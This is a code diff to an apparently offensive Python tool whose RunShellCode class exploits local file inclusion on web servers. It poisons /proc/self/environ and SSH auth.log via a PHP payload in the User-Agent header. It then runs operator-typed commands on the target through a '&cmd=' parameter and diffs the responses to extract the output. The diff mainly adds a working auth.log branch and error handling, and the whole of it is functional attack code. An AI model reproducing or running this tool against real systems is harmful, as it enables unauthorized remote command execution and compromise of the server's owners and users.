@@ -9,14 +9,13 @@ import re
 import os
 import  base64
 import difflib
+import shutil
+import ssl
 W = '\033[0m'     
 R = '\033[31m'    
-G = '\033[0;32m'  
-O = '\33[37m'     
-B = '\033[34m'    
-P = '\033[35m'   
+O = '\33[37m'      
 Y = '\033[1;33m' 
-import shutil
+
 
 
 WebBanner =O +"""  
@@ -64,15 +63,15 @@ class RunShellCode:
                 Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                  ('Cookie',str(self.Cookie).replace('\n',''))]
                 command = self.url+'&cmd='+inputsuer  
-                with open("./Package/shell/.repones.txt",'w') as repones:
-                    repones = repones.write(str(request.open(WEB).read()))
-                with open("./Package/shell/.repones2.txt",'w') as repones2:
-                    repones2 = repones2.write(str(request.open(command ).read()))     
-                with open("./Package/shell/.repones.txt",'r') as f:
+                with open("./Package/shell/.response.txt",'w') as response:
+                    response = response.write(str(request.open(WEB).read()))
+                with open("./Package/shell/.response2.txt",'w') as response2:
+                    response2 = response2.write(str(request.open(command ).read()))     
+                with open("./Package/shell/.response.txt",'r') as f:
                      file1_lines = f.read().split("\\n")
-                with open("./Package/shell/.repones2.txt",'r') as Rqreder:
+                with open("./Package/shell/.response2.txt",'r') as Rqreder:
                     file2_lines = Rqreder.read().split("\\n")  
-                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.repones2.txt', tofile='.repones1.txt', lineterm='')
+                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.response2.txt', tofile='.response1.txt', lineterm='')
                 for line in diff:
                     if line.startswith('+') and not line.startswith('+++') and not line.startswith('++'):
                         cleaned_content = line[1:]
@@ -85,10 +84,14 @@ class RunShellCode:
                             data= data.write(str(cleaned_content))
   
                 with open("./Package/shell/.data",'r')as data:
-                   data = data.readlines()
-                   print(Y+"web_repones  : "+W ,data[0].replace('\n',''))
-                   for l in data[1:] :
-                       print("\t\t"+l.replace('\n',''))           
+                    data = data.readlines()
+                    try:
+                       print(Y+"web_response  : "+W ,data[0].replace('\n',''))
+                       for l in data[1:] :
+                           print("\t\t"+l.replace('\n','')) 
+                    except Exception as a :
+                        print(Y+"web_response  : "+W , a)
+                        continue                 
                 if os.path.exists ("./Package/shell/.data")  :
                    os.remove("./Package/shell/.data")  
         elif "proc/self/environ" in self.url \
@@ -98,21 +101,21 @@ class RunShellCode:
             request.addheaders = [('User-agent', 'Mozilla/5.0'+paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                   ('Cookie',str(self.Cookie).replace('\n',''))]
-            with open("./Package/shell/.repones.txt",'w') as repones:
-                repones = repones.write(str(request.open(self.url).read()))                      
+            with open("./Package/shell/.response.txt",'w') as response:
+                response = response.write(str(request.open(self.url).read()))                      
             while True :
                 inputsuer = input(R+"Your_request :  "+W)
                 request = mechanize.Browser()
                 request.set_handle_robots(False)
                 command = self.url+'&cmd='+inputsuer 
-                with open("./Package/shell/.repones2.txt",'w') as repones2:
-                    repones2 = repones2.write(str(request.open(command ).read()))     
-                with open("./Package/shell/.repones.txt",'r') as f:
+                with open("./Package/shell/.response2.txt",'w') as response2:
+                    response2 = response2.write(str(request.open(command ).read()))     
+                with open("./Package/shell/.response.txt",'r') as f:
                      file1_lines = f.read().split("\\n")
-                with open("./Package/shell/.repones2.txt",'r') as Rqreder:
+                with open("./Package/shell/.response2.txt",'r') as Rqreder:
                     file2_lines = Rqreder.read().split("\\n")  
                 DataList = []    
-                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.repones2.txt', tofile='.repones1.txt', lineterm='')
+                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.response2.txt', tofile='.response1.txt', lineterm='')
                 for line in diff:
                     if line.startswith('+') and not line.startswith('+++') and not line.startswith('++'):
                         line= "".join(line.replace("Mozilla/5.0",'\n'))
@@ -134,18 +137,71 @@ class RunShellCode:
                                   pass
                                 else:
                                     DataList.append(line)
-
-                print(Y+"web_repones  : "+W + DataList[0].replace('\n','').replace('(',''))
-                for l in DataList[1:] :
-                      print("\t\t"+l.replace('\n','').replace('(',''))           
-                if os.path.exists ("./Package/shell/.data")  :
-                   os.remove("./Package/shell/.data")
-                shutil.copyfile("./Package/shell/.repones2.txt", "./Package/shell/.repones.txt")
+                try:
+                    print(Y+"web_response  : "+W + DataList[0].replace('\n','').replace('(',''))
+                    for l in DataList[1:] :
+                          print("\t\t"+l.replace('\n','').replace('(',''))           
+                    if os.path.exists ("./Package/shell/.data")  :
+                       os.remove("./Package/shell/.data")
+                    shutil.copyfile("./Package/shell/.response2.txt", "./Package/shell/.response.txt")
+                except Exception as a :
+                       print(Y+"web_response s: "+W , a)
+                       continue
         elif 'auth' in self.url\
         or 'auth.log' in self.url:
-            print("ssh")
-            time.sleep(10)        
-
+            request = mechanize.Browser()
+            request.set_handle_robots(False)
+            request.set_handle_redirect(True)
+            request.set_handle_refresh(True, max_time=1)
+            request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                 ('Cookie',str(self.Cookie).replace('\n',''))]
+            with open("./Package/shell/.response.txt",'w') as response:
+                response = response.write(str(request.open(self.url).read()))  
+            while True:
+                inputsuer = input(R+"Your_request :  "+W)
+                request = mechanize.Browser()
+                request.set_handle_robots(False)
+                request.set_handle_redirect(True)
+                request.set_handle_refresh(True, max_time=1)
+                request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                 ('Cookie',str(self.Cookie).replace('\n',''))]
+                command = self.url+'&cmd='+inputsuer  
+                with open("./Package/shell/.response2.txt",'w') as response2:
+                    response2 = response2.write(str(request.open(command ).read()))     
+                with open("./Package/shell/.response.txt",'r') as f:
+                     file1_lines = f.read().split("\\n")
+                with open("./Package/shell/.response2.txt",'r') as Rqreder:
+                    file2_lines = Rqreder.read().split("\\n")  
+                DataList = []
+                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.repones2.txt', tofile='.repones1.txt', lineterm='')
+                for line in diff:
+                    if line.startswith('+') and not line.startswith('+++') and not line.startswith('++'):  
+                        cleaned_content= line[1:]
+                       # cleaned_text = re.sub(r'\w.+\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b..+\s.+\d\D\d\S.+','' , cleaned_content)
+                        cleaned_content = re.sub(r"^\w+.+\d:\d.+:\s+\w...........",'', cleaned_content)
+                        cleaned_content = re.sub(r'\+\s+', '', cleaned_content)
+                        with open("./Package/shell/.data",'w') as data:
+                            data = data.write(cleaned_content)
+                        with open("./Package/shell/.data",'r') as data: 
+                            data = data.read().split("\n")
+                        for line in data:
+                            if 'ssh2' in line or 'invalid user' in line or 'from' in line\
+                            or 'preauth' in line:
+                                pass
+                            elif line in DataList:
+                                pass
+                            else:
+                                DataList.append(line)
+                try:
+                    print(Y+"web_response : "+W + DataList[0].replace('\n','').replace('(',''))
+                    for l in DataList[1:] :
+                       print("\t\t"+l.replace('\n','').replace('(',''))           
+                    if os.path.exists ("./Package/shell/.data")  :
+                       os.remove("./Package/shell/.data")
+                    shutil.copyfile("./Package/shell/.response2.txt", "./Package/shell/.response.txt")
+                except Exception as a :
+                    print(Y+"web_response : "+W , a)
+                    continue                          
 if __name__=='__main__':
     try:
        RunShellCode()
